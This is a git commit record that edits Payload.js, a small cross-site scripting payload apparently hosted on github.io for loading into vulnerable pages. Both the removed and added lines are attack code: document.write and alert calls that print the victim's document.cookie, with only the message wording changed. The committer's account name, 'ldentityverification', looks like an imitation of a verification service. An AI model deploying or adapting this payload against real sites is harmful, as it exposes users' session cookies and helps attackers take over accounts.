4075bc5ace7f9e33c16c1dae1ca09084e8947a50
ldentityverification <41704387+ldentityverification@users.noreply.github.com>
2018-10-11 19:59:55 +0100

    Update Payload.js

--- Payload.js
+++ Payload.js
@@ -1,3 +1,3 @@
 
-document.write ("This is an XSS from *.github.io domain " + document.cookie);
-alert ("This is remote text via xss.js located at *.github.io " + document.cookie);
+document.write ("This is an XSS from *.github.io domain" + document.cookie);
+alert ("This is an XSS from *.github.io domain" + document.cookie);
